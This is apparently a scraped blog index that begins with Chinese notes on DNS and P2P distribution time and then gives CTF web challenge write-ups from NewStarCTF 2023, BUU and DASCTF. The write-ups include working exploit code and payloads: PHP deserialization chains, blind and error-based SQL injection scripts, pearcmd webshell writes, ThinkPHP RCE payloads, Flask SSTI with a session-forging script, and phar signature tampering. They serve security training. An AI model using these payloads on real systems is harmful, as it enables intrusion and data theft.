附加区域包含了其他有帮助的记录。例如，一个MX请求的回答报文的回答区域包含了一条资源记录，该记录提供了邮件服务器的规范主机名。该附加区域包含一个类型A记录，该记录提供了用于该邮件服务器的规范主机名的IP地址。 :::info no-icon nslookup程序能够做到让正在工作的主机直接向某些DNS服务器发送一个DNS查询报文。 ::: P2P文件分发根据书上例子，假设服务器要将一个文件分发给一个固定的对等方集合，其中服务器与对等方使用接入链路与因特网相连，如下图所示 设us为服务器接入链路的上传速率，ui表示第i个对等方接入链路的上传速率，di表示第i个对等方接入链路的下载速率，F表示被分发的文件长度（单位一般为bit），N表示对等方的数量，Dcs是客户-服务器体系结构的分发时间。 分发时间（distribution time）是所有N个对等方得到该文件的副本所需的时间。 为了排除影响，这里的环境假设为：因特网核心有足够的带宽（所以速率的瓶颈都在接入链路），服务器与客户没有参与任何其他网络应用（上传与下载的带宽能够全部用来发放该文件） 列出所求： 由于服务器要传文件给N个对等方，因此上传文件的总量是NF bits，上传文件花费的总时间为NF / us； 令dmin表示所有对等方中最小的下载速率，因此dmin = min{d1,d2,d3,……,dN}，这就导致有最小速率的对等方不能在F / dmin内获取一个完整的文件，因此分发时间至少为F / dmin； 因此可以得到： ​ ==Dcs &gt;= max{NF / us,F / dmin}；== 不难看出，当N足够大时，客户-服务器分发时间就是由NF / us来决定的。 接下来看一下P2P体系结构，条件不变，列出所求： 开始分发时，由于只有服务器有文件，因此服务器至少要上传该文件1次，因此分发时间至少为F / us（与前者有差别的是，服务器在分发一次文件后可以选择不用发送，因为该体系结构下可以通过其他对等方来分发该文件； 跟前者一样的是，有最小速率的对等方不能在F / dmin内获取一个完整的文件，因此分发时间至少为F / dmin； 在该体系结构下，系统整体的总上传能力等于服务器的上传速率加每个对等方的上传速率，即utotal = u1 + u2 + … + uN; 综上，设DP2P为P2P体系结构下的最小分发时间，得到 ​ ==DP2P = max{F / us,F / dmin,NF / (us + utotal)}== 下图是两个结构的分发时间的变化趋势","link":"/2024/03/26/ComputerInternet/Computer-Internet2/"},{"title":"Computer-Internet3","text":"运输层","link":"/2024/04/10/ComputerInternet/Computer-Internet3/"},{"title":"平台做题记录","text":"*ez_json123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384const express = require('express');const app = express();var bodyParser = require('body-parser');app.use(bodyParser.json());const fs = require(&quot;fs&quot;);const session = require(&quot;express-session&quot;);const cookieParser = require('cookie-parser');session_secret = Math.random().toString(36).substr(2);app.use(cookieParser(session_secret));app.use(session({ secret: session_secret, resave: true, saveUninitialized: true}));function copyArray(arr1) { var arr2 = new Array(arr1.length); for (var i = 0; i &lt; arr1.length; i++) { if (arr1[i] instanceof Object) { arr2[i] = copyArray(arr1[i]); } else { arr2[i] = arr1[i]; } } return arr2;}app.get('/', function(req, res) { res.send('see `/src`');});app.post('/get_admin', function(req, res) { if (req.body.name) { req.session.user = { &quot;username&quot;: req.body.name }; const properties = req.body.properties; for (let i = 0; i &lt; properties.length; i++) { if (properties[i] == 'admin') { res.send('cant set admin by self'); return; } } req.session.user.properties = copyArray(properties); res.send('Success'); } else { res.send(&quot;input username&quot;); } console.log(req.session.user) console.log(req.session.user.__proto__)});app.post('/flag', function(req, res) { if (req.session.user &amp;&amp; req.session.user.properties) { for (var i = 0; i &lt; req.session.user.properties.length; i++) { if (req.session.user.properties[i] == 'admin') { try { const data = fs.readFileSync('/flag'); res.send(data) } catch (err) { res.send(&quot;fail to open flag&quot;) console.error(err); } } } } else { res.send(&quot;not vm2 tester rights&quot;); }});app.get('/src', function(req, res) { var data = fs.readFileSync('app.js'); res.send(data.toString());});app.listen(3000, function() { console.log('start listening on port 3000');}); 提示说不是原型链污染，分析代码也得知并不是沙箱逃逸","link":"/2024/03/27/Scr1w-Platform/sssctf/"},{"title":"nssctf-round20","text":"真亦假，假亦真dirsearch扫扫就行，有个/flag","link":"/2024/03/30/nssctf/nssctf-round20/"},{"title":"buu做题记录（2）","text":":::warning no-icon 做题记录如下 buu1 -&gt; buu2 ::: 书接上回 [NewStarCTF 2023 公开赛道]POP Gadget1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phphighlight_file(__FILE__);class Begin{ public $name; public function __destruct() { if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name)){ echo &quot;Hello&quot;; }else{ echo &quot;Welcome to NewStarCTF 2023!&quot;; } }}class Then{ private $func; public function __toString() { ($this-&gt;func)(); return &quot;Good Job!&quot;; }}class Handle{ protected $obj; public function __call($func, $vars) { $this-&gt;obj-&gt;end(); }}class Super{ protected $obj; public function __invoke() { $this-&gt;obj-&gt;getStr(); } public function end() { die(&quot;==GAME OVER==&quot;); }}class CTF{ public $handle; public function end() { unset($this-&gt;handle-&gt;log); }}class WhiteGod{ public $func; public $var; public function __unset($var) { ($this-&gt;func)($this-&gt;var); }}@unserialize($_POST['pop']); pop链很容易构造： Begin::destruct-&gt;Then::toString-&gt;Super::invoke-&gt;Handle::call-&gt;CTF::end-&gt;WhiteGod::unset exp: 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Begin{ public $name;}class Then{ private $func; public function __construct($a){ $this-&gt;func = $a; }}class Handle{ protected $obj; public function __construct($a){ $this-&gt;obj = $a; }}class Super{ protected $obj; public function __construct($a){ $this-&gt;obj = $a; }}class CTF{ public $handle; public function __construct($a){ $this-&gt;handle = $a; }}class WhiteGod{ public $func = 'readfile'; public $var = '/flag';}$a = new Begin();$a-&gt;name = new Then(new Super(new Handle(new CTF(new WhiteGod()))));echo(serialize($a));echo(urlencode(serialize($a)));?&gt; 这里暂时不清楚system为什么读取不到flag，也不能执行ls / [NewStarCTF 2023 公开赛道]midsql时间盲注，因为order by和布尔注入都不行。 过滤了空格和等号，可以分别用/**/和like绕过，脚本如下： 1234567891011121314151617181920212223242526import requestsimport timeurl = 'http://5686ca9d-7929-475e-93b4-f47d88c70ecc.node5.buuoj.cn:81/?id='flag = ''for i in range(1,1000): # payload = '1/**/and/**/if((ascii(substr(database(),{},1))&gt;{}),sleep(5),1);#' # ctf # payload = '1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/\\'ctf\\'),{},1))&gt;{}),sleep(4),1);#' #items # payload = '1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/\\'items\\'),{},1))&gt;{}),sleep(4),1);#' #id,name,price payload = '1/**/and/**/if((ascii(substr((select/**/group_concat(id,name,price)/**/from/**/items),{},1))&gt;{}),sleep(4),1);#' left = 32 right = 127 mid = (left + right) &gt;&gt; 1 while(left &lt; right): str1 = url + payload.format(i,mid) time_start = time.time() res = requests.get(str1) print(str1) if time.time() - time_start &gt; 2: left = mid + 1 else: right = mid mid = (left + right) &gt;&gt; 1 flag += chr(mid) print(flag) [NewStarCTF 2023 公开赛道]OtenkiGirl这题应该是原型链污染，根据提示，我们查看route目录下的info.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const Router = require(&quot;koa-router&quot;);const router = new Router();const SQL = require(&quot;./sql&quot;);const sql = new SQL(&quot;wishes&quot;);const CONFIG = require(&quot;../config&quot;)const DEFAULT_CONFIG = require(&quot;../config.default&quot;)async function getInfo(timestamp) { timestamp = typeof timestamp === &quot;number&quot; ? timestamp : Date.now(); // Remove test data from before the movie was released let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime(); timestamp = Math.max(timestamp, minTimestamp); const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e }); return data;}router.post(&quot;/info/:ts?&quot;, async (ctx) =&gt; { if (ctx.header[&quot;content-type&quot;] !== &quot;application/x-www-form-urlencoded&quot;) return ctx.body = { status: &quot;error&quot;, msg: &quot;Content-Type must be application/x-www-form-urlencoded&quot; } if (typeof ctx.params.ts === &quot;undefined&quot;) ctx.params.ts = 0 const timestamp = /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;) ? Number(ctx.params.ts) : ctx.params.ts; if (typeof timestamp !== &quot;number&quot;) return ctx.body = { status: &quot;error&quot;, msg: &quot;Invalid parameter ts&quot; } try { const data = await getInfo(timestamp).catch(e =&gt; { throw e }); ctx.body = { status: &quot;success&quot;, data: data } } catch (e) { console.error(e); return ctx.body = { status: &quot;error&quot;, msg: &quot;Internal Server Error&quot; } }})module.exports = router; 有一个对路径名的过滤，不过影响不大，传数字就行了 查看submit.js 123456789101112const merge = (dst, src) =&gt; { if (typeof dst !== &quot;object&quot; || typeof src !== &quot;object&quot;) return dst; for (let key in src) { if (key in dst &amp;&amp; key in src) { dst[key] = merge(dst[key], src[key]); } else { dst[key] = src[key]; } } return dst;} 发现有merge函数，典型的原型链污染 我们回到info.js，注意到一个重要部分 123456789async function getInfo(timestamp) { timestamp = typeof timestamp === &quot;number&quot; ? timestamp : Date.now(); // Remove test data from before the movie was released let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime(); timestamp = Math.max(timestamp, minTimestamp); const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e }); return data;} 根据注释，猜测flag在测试的数据中 然后这里获取sql数据的条件是不早于当前时间，因此想要获取数据，就需要把时间调早一点（因为返回的数据都是晚于最小公开时间的） 先找找最小公开时间在哪 追踪一下与config相关的两个文件 12345678module.exports = { app_name: &quot;OtenkiGirl&quot;, default_lang: &quot;ja&quot;, min_public_time: &quot;2019-07-09&quot;, server_port: 9960, webpack_dev_port: 9970} 那我们的时间只要调到2019.07.09之前就行 抓包构造一下 刷新一下界面，发现有远古时期的标签，那就去看一看 直接hackbar随便post一个数据然后访问就行（之前提到有一个路径名过滤，只要传数字就行了） [NewStarCTF 2023 公开赛道]Include 🍐根据题目描述是远程文件包含漏洞 先找找环境变量有没有flag 提示我们去查看register_argc_argv 发现相关功能处于On状态，然后再根据标题，猜测是要利用pearcmd.php进行文件包含 register_argc_argv的简单作用它可以通过$_SERVER['argv']获取命令行参数，所以你会看到它现在的数据是这样的 在web环境下，如果想要获取多个参数，则需要用+把不同变量分隔开来（这里我懒得复现了） pearcmd.php的简单讲述pear文件中用到了pearcmd.php文件，可以先看看 12345678910111213141516public static function readPHPArgv(){ global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv;} $_SERVER['argv']可控，毕竟我们是要传参数上去的 :::info pear一般默认安装在/usr/local/lib/php，不同系统的安装目录可能不同 ::: 几个佬对它的详细说明我放在这了：dalao1，dalao2 上手！ pear命令中有一个config_create，根据格式pear config-create [options] &lt;root path&gt; &lt;filename&gt;可以这样构造： ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/a.php :::danger no-icon 至于为什么有个/&amp;和&amp;/，我想应该是格式要求的吧 至于为什么能直接用config-create，我想应该是之前说到的register_argc_argv导致的吧，毕竟是能直接把传入的数据作为参数传递 ::: 这样下来构造后，大致意思就是：通过pear命令config-create，来包含/usr/local/lib/php/pearcmd.cmd文件，木马写入到a.php中 （有空再回头来说说为什么这么写） 然后访问a.php传参 :::danger 这里这里一定要用抓包放包的方式去传，而且必须要把被编码的字符给还原回来，不然php文件根本执行不了 ::: [NewStarCTF 2023 公开赛道]InjectMe点击图片发现可以跳转 查看110.jpg 有个对.的过滤，由于没有循环检测，因此可以考虑双写绕过 进入download路由，由于路由是由python写的，猜测源码在app.py里面 根据给出的dockerfile，发现源码复制到/app目录下了 可以构造payload：url/download?file=....//....//....//app/app.py 得到源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import osimport refrom flask import Flask, render_template, request, abort, send_file, session, render_template_stringfrom config import secret_keyapp = Flask(__name__)app.secret_key = secret_key@app.route('/')def hello_world(): # put application's code here return render_template('index.html')@app.route(&quot;/cancanneed&quot;, methods=[&quot;GET&quot;])def cancanneed(): all_filename = os.listdir('./static/img/') filename = request.args.get('file', '') if filename: return render_template('img.html', filename=filename, all_filename=all_filename) else: return f&quot;{str(os.listdir('./static/img/'))} &lt;br&gt; &lt;a href=\\&quot;/cancanneed?file=1.jpg\\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;@app.route(&quot;/download&quot;, methods=[&quot;GET&quot;])def download(): filename = request.args.get('file', '') if filename: filename = filename.replace('../', '') filename = os.path.join('static/img/', filename) print(filename) if (os.path.exists(filename)) and (&quot;start&quot; not in filename): return send_file(filename) else: abort(500) else: abort(404)@app.route('/backdoor', methods=[&quot;GET&quot;])def backdoor(): try: print(session.get(&quot;user&quot;)) if session.get(&quot;user&quot;) is None: session['user'] = &quot;guest&quot; name = session.get(&quot;user&quot;) if re.findall( r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.', name): abort(500) else: return render_template_string( '竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁' % name) except Exception: abort(500)@app.errorhandler(404)def page_not_find(e): return render_template('404.html'), 404@app.errorhandler(500)def internal_server_error(e): return render_template('500.html'), 500if __name__ == '__main__': app.run('0.0.0.0', port=8080) 核心在/backdoor路由，应该是session传入脚本进行命令执行 这个简单，找到secret_key然后把命令加密就行 开头看到secret_key放入了config文件中，下载一下config：download?file=....//....//....//app/config.py 得到secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; 由于许多命令被过滤掉了，可以考虑八进制编码绕过 最初的攻击脚本可以这样写：{{x.__init__.__globals__.__getitem__.('__builtins__').__getitem__.('eval')('__import__(\"os\").popen(\"ls /\").read()')}} 攻击脚本分析如下：（gpt写的） x.__init__.__globals__.__getitem__：这部分尝试访问 x 对象的 __init__ 方法的全局作用域。__init__ 是 Python 类的构造函数，而 __globals__ 是一个字典，存储了函数的全局变量。 __getitem__('__builtins__')：通过 __getitem__ 方法获取 __builtins__ 模块，这是一个包含了 Python 所有内置函数和变量的模块。 __getitem__('eval')：进一步通过 __getitem__ 获取内置的 eval 函数。eval 函数用于执行一个字符串表达的 Python 表达式，并返回表达式的值。 eval('__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()')：通过 eval 执行字符串中的代码。这段代码首先通过 __import__(&quot;os&quot;) 导入 os 模块，然后使用 os.popen(&quot;ls /&quot;) 执行 Unix/Linux 命令 ls /，该命令列出根目录下的所有文件和文件夹。最后，使用 .read() 方法读取命令的输出结果。 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import reimport requestsimport subprocess# 把这个下载了，需要使用里面的flask-session-cookie-manager3.py# # https://github.com/noraj/flask-session-cookie-managerdef string_to_octal_ascii(s): octal_ascii = &quot;&quot; for char in s: char_code = ord(char) octal_ascii += &quot;\\\\\\\\&quot; + format(char_code, '03o') # octal_ascii += &quot;\\\\\\\\&quot; + format(char_code, 'o') return octal_asciisecret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;# payload = &quot;{%print(7*7)%}&quot;# payload = &quot;{%print(\\&quot;\\&quot;\\\\\\\\u005f\\\\\\\\u005f\\&quot;\\&quot;)%}&quot;# payload = &quot;{%print(\\&quot;\\&quot;\\\\\\\\x5f\\\\\\\\x5f\\&quot;\\&quot;)%}&quot;eval_shell = &quot;\\&quot;\\&quot;&quot;+string_to_octal_ascii(&quot;__import__(\\&quot;os\\&quot;).popen(\\&quot;cat /*\\&quot;).read()&quot;)+&quot;\\&quot;\\&quot;&quot;print(eval_shell)# docker部署&amp;windows运行payload# {{x.__init__.__globals__.__builtins__.eval('__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()')}}payload = &quot;{{%print(xxx|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)|attr(\\&quot;\\&quot;\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\&quot;\\&quot;)(\\&quot;\\&quot;\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\&quot;\\&quot;)({0}))%}}&quot;.format(eval_shell)print(payload)command = &quot;python flask_session_cookie_manager3.py encode -s \\&quot;{0}\\&quot; -t \\&quot;{{'user':'{1}'}}\\&quot;&quot;.format(secret_key,payload)print(command)session_data = subprocess.check_output(command, shell=True)print(session_data)# linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。session_data = session_data[:-2].decode('utf-8')# session_data = session_data[:-1].decode('utf-8')print(session_data)url = &quot;http://127.0.0.1:8080/backdoor&quot;cookies = {&quot;session&quot;: session_data}res = requests.get(url=url, cookies=cookies)# print(res.text)pattern = r'&lt;h1&gt;(.*)&lt;/h1&gt;'result_content = re.search(pattern, res.text, re.S)# print(result_content)if result_content: result = result_content.group(1) print(result)else: print(&quot;something wrong!&quot;) 这里复现失败了，不道为什么 [NewStarCTF 2023 公开赛道]Final 传参使其报错，获取版本号，根据版本号找到payload：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 然后变量s传数据captcha，发包改为POST方式（system看起来是被ban了，所以看看phpinfo） 能够执行，那就找一下DOCUMENT_ROOT，它是当前运行的脚本所在的文档根目录的绝对路径，把马写在里面 payload:_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo '&lt;?php eval($_POST['cmd']);?&gt;' &gt; /var/www/public/shell.php 这里没有读取到flag，猜测是权限的问题 用蚁剑连接进入终端，执行以下命令即可】 [极客大挑战 2019]HardSQL这题是报错注入，过滤了空格和=，=可以考虑用like绕过，空格可以用^绕过 当然了，还禁用了其他符号，比如说* payload如下： ?username=1&amp;password=1'^extractvalue(1%2Cconcat(0x7e%2C(select(database()))))%23 ?username=1&amp;password=1'^extractvalue(1%2Cconcat(0x7e%2C(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))%23 ?username=1&amp;password=1'^extractvalue(1%2Cconcat(0x7e%2C(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))%23 ?username=1&amp;password=1'^extractvalue(1%2Cconcat(0x7e%2C(select(password)from(geek.H4rDsq1))))%23 由于flag只显示一部分，说明原文本的长度超过限定长度，可以考虑用left或right函数 ?username=1&amp;password=1'^extractvalue(1%2Cconcat(0x7e%2C(select(right(password%2C20))from(geek.H4rDsq1))))%23 [NewStarCTF 2023 公开赛道]Unserialize Again1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 &lt;?phphighlight_file(__FILE__);error_reporting(0); class story{ private $user='admin'; public $pass; public $eating; public $God='false'; public function __wakeup(){ $this-&gt;user='human'; if(1==1){ die(); } if(1!=1){ echo $fffflag; } } public function __construct(){ $this-&gt;user='AshenOne'; $this-&gt;eating='fire'; die(); } public function __tostring(){ return $this-&gt;user.$this-&gt;pass; } public function __invoke(){ if($this-&gt;user=='admin'&amp;&amp;$this-&gt;pass=='admin'){ echo $nothing; } } public function __destruct(){ if($this-&gt;God=='true'&amp;&amp;$this-&gt;user=='admin'){ system($this-&gt;eating); } else{ die('Get Out!'); } }} if(isset($_GET['pear'])&amp;&amp;isset($_GET['apple'])){ // $Eden=new story(); $pear=$_GET['pear']; $Adam=$_GET['apple']; $file=file_get_contents('php://input'); file_put_contents($pear,urldecode($file)); file_exists($Adam);}else{ echo '多吃雪梨';} 这题主要考phar伪协议，由于file_exists()中的变量可控，我们可以用其配合phar伪协议读取写入的文件来getshell。 phar文件生成123456789101112&lt;?phpclass story{ public $eating = 'cat /f*'; public $God='true'; }$phar = new Phar(&quot;1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;); $a = new story();$phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); 这里我们需要运行的是__destruct()的system，因此把eating和God改了就好 传马 由于在文件生成过程中内容被修改过（为了绕过__wakeup()，因此需要更换一个签名，这里用到了sha256） 1234567891011121314151617181920212223242526from hashlib import sha256import requestsimport urllib.parsewith open('1.phar','rb') as file1: f = file1.read()s = f[:-40]s = s.replace(b'O:5:&quot;story&quot;:2',b'O:5:&quot;story&quot;:3')h = f[-8:]newfile = s + sha256(s).digest() + hwith open('new.phar','wb') as file2: file2.write(newfile)url = 'http://bd7d412e-1f2f-4257-b51b-8602813e8098.node5.buuoj.cn:81/pairing.php'param = { 'pear': 'new.phar', 'apple': 'phar://new.phar'}with open('new.phar','rb') as file3: f = file3.read() fi = urllib.parse.quote(f) print(fi) res = requests.post(url=url,params=param,data=fi) print(res.text) [NewStarCTF 2023 公开赛道]逃这题就是反序列化中的字符逃逸 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);function waf($str){ return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);}class GetFlag { public $key; public $cmd = &quot;whoami&quot;; public function __construct($key) { $this-&gt;key = $key; } public function __destruct() { system($this-&gt;cmd); }}unserialize(waf(serialize(new GetFlag($_GET['key'])))); 根据代码，当有一个bad转换为good时，原字符串就会多一个字符 字符串逃逸原理看看这里 了解完原理后，我们脚本可以这样写： 12345678910111213141516&lt;?phpclass GetFlag { public $key; public $cmd = &quot;ls /&quot;; public function __construct($key) { $this-&gt;key = $key; } public function __destruct() { system($this-&gt;cmd); }}$a = new GetFlag('badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad');//&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;}中共有24个字符，所以要24个badecho(serialize($a));?&gt; payload为badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;} 把命令改了拿flag即可 [NewStarCTF 2023 公开赛道]More Fast12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455 &lt;?phphighlight_file(__FILE__);class Start{ public $errMsg; public function __destruct() { die($this-&gt;errMsg); }}class Pwn{ public $obj; public function __invoke(){ $this-&gt;obj-&gt;evil(); } public function evil() { phpinfo(); }}class Reverse{ public $func; public function __get($var) { ($this-&gt;func)(); }}class Web{ public $func; public $var; public function evil() { if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var)){ ($this-&gt;func)($this-&gt;var); }else{ echo &quot;Not Flag&quot;; } }}class Crypto{ public $obj; public function __toString() { $wel = $this-&gt;obj-&gt;good; return &quot;NewStar&quot;; }}class Misc{ public function evil() { echo &quot;good job but nothing&quot;; }}$a = @unserialize($_POST['fast']);throw new Exception(&quot;Nope&quot;); 分析一下，大致的pop链如下： Start::__destruct() -&gt; Crypto::__toString() -&gt; Reverse::__get() -&gt; Pwn::__invoke() -&gt; Web::__evil 不过有个问题，die会使整个函数停止运转，说明我们还需要注意绕过一下 这里的throw涉及到垃圾回收机制（GC回收） 在php中，当对象被销毁时会自动调用__destruct()，但如果程序报错或者抛出异常，就不会触发该魔术方法。 当一个类创建之后它会自己消失，而 __destruct()的触发条件就是一个类被销毁时触发，throw回收了自动销毁的类，导致__destruct()检测不到有东西销毁，从而无法触发__destruct()。 根据这个特性，我们可以提前触发GC回收来抛出异常，从而调用__destruct()。 这里可以使数组对象为NULL，这样就能提前触发throw 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpclass Start{ public $errMsg; public function __destruct() { die($this-&gt;errMsg); }}class Pwn{ public $obj; public function __invoke(){ $this-&gt;obj-&gt;evil(); } public function evil() { phpinfo(); }}class Reverse{ public $func; public function __get($var) { ($this-&gt;func)(); }}class Web{ public $func='system'; public $var='cat /f*'; public function evil() { if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var)){ ($this-&gt;func)($this-&gt;var); }else{ echo &quot;Not Flag&quot;; } }}class Crypto{ public $obj; public function __toString() { $wel = $this-&gt;obj-&gt;good; return &quot;NewStar&quot;; }}$start = new Start();$pwn = new Pwn();$crypto = new Crypto();$web = new Web();$reverse = new Reverse();$start-&gt;errMsg = $crypto;$crypto-&gt;obj = $reverse;$reverse-&gt;func = $pwn;$pwn-&gt;obj = $web;$a = array($start,0);echo(serialize($a));?&gt; 得到a:2:{i:0;O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;}}}}}i:1;i:0;}后把i:1改为i:0，这样就代表数组对象为空，会触发throw，其他就正常执行了 [NewStarCTF 2023 公开赛道]flask diskadmin manage一栏需要我们输入pin码，说明flask开启了debug模式，进而说明app.py在被修改后会立刻加载，我们重新编写一个app.py上传rce即可 123456789101112131415from flask import Flask,requestimport osapp = Flask(__name__)@app.route('/')def index(): try: cmd = request.args.get('cmd') data = os.popen(cmd).read() return data except: pass return &quot;1&quot;if __name__=='__main__': app.run(host='0.0.0.0',port=5000,debug=True) [DASCTF 2023 &amp; 0X401七月暑期挑战赛]ez_cms根据cms的版本和类型，很容易找到对应靶场 看了相关介绍，发现cms存在越权漏洞以及sql注入（其实弱密码也有） 访问/admin登录 之前在登陆的时候试了试文件包含，但是没有反应，推测是有过滤或者修改了文件权限什么的？ 尝试下载index.php 得到： 1234567&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET['r']); //接收文件名$action=$file==''?'index':$file; //判断为空或者等于indexinclude('files/'.$action.'.php'); //载入相应文件?&gt; 果然存在文件包含，但是猜测flag并不会写在php文件里，有可能在环境变量或者根目录里什么的，先不大费周章地搞这个 看看能不能下载环境变量的内容 发现并不行，感觉像是有权限或者改名称或者换目录？ 在之前的后台系统中，我们发现了一个上传文件的点，看看能不能传:horse: 似乎是不可行的（这里我是抓包改名称后才传的:horse:，系统对文件后缀名有检查） 那就只有文件包含了，这里用pear（怎么最近做题只要有文件包含就有pear） 之前说过，pearcmd.php默认安装在/usr/local/lib/php payload就可以很好地进行构造了：../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST['cmd']);?&gt;+/tmp/shell.php（注意代码中include是自动加了后缀php的） 然后就可以rce了 [DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import uuidfrom flask import Flask, request, sessionfrom secret import black_listimport jsonapp = Flask(__name__)app.secret_key = str(uuid.uuid4())def check(data): for i in black_list: if i in data: return False return Truedef merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class user(): def __init__(self): self.username = &quot;&quot; self.password = &quot;&quot; pass def check(self, data): if self.username == data['username'] and self.password == data['password']: return True return FalseUsers = []@app.route('/register',methods=['POST'])def register(): if request.data: try: if not check(request.data): return &quot;Register Failed&quot; data = json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;Register Failed&quot; User = user() merge(data, User) Users.append(User) except Exception: return &quot;Register Failed&quot; return &quot;Register Success&quot; else: return &quot;Register Failed&quot;@app.route('/login',methods=['POST'])def login(): if request.data: try: data = json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;Login Failed&quot; for user in Users: if user.check(data): session[&quot;username&quot;] = data[&quot;username&quot;] return &quot;Login Success&quot; except Exception: return &quot;Login Failed&quot; return &quot;Login Failed&quot;@app.route('/',methods=['GET'])def index(): return open(__file__, &quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5010) 很明显的一个原型链污染 在这里，open(__file__, &quot;r&quot;).read()是直接返回服务器代码的，我们可以修改__file__来造成任意文件的读取 这里读取环境变量来构造payload： 1234567891011{ &quot;username&quot;:&quot;user&quot;, 